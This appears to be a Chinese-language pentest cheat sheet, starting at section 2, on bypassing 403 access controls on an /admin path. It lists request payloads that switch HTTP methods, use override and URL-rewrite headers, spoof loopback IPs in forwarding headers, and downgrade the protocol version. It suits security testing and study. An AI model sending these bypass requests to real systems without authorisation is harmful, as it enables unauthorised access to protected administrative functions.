# HTTP 方法/Header 绕过
## 2. HTTP 方法绕过

### 2.1 直接更换方法

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (可能泄露 Allowed Methods)
HEAD /admin → 200  ✓ (确认可访问，无 body)
```

### 2.2 Method Override Header

代理按方法阻止，但后端读取 override header：

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

POST /admin HTTP/1.1
_method=PUT  (POST body — Rails/Laravel)
```

### 2.3 自定义 / 无效方法

```
FOOBAR /admin HTTP/1.1     → 部分 ACL 只检查 GET/POST
PROPFIND /admin HTTP/1.1   → WebDAV 方法
```

---

## 3. Header 绕过

### 3.1 URL 重写 Header（Nginx/IIS）

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

代理看到 `GET /`（放行），后端路由到 `/admin`。

### 3.2 IP 伪造 Header（白名单绕过）

每个 header 尝试 `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`：

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | Forwarded: for=127.0.0.1
```

IP 编码变体：`0177.0.0.1`（八进制）, `2130706433`（十进制）, `0x7f000001`（十六进制）

### 3.3 其他 Header

```http
Referer: https://target.com/admin
Origin: https://target.com
Host: localhost
X-Forwarded-Host: localhost
Content-Type: application/json
X-Requested-With: XMLHttpRequest
```

---

## 4. 协议版本绕过

```http
# HTTP/1.0（部分 ACL 只针对 HTTP/1.1）
GET /admin HTTP/1.0

# HTTP/0.9（极老，无 header）
GET /admin
```
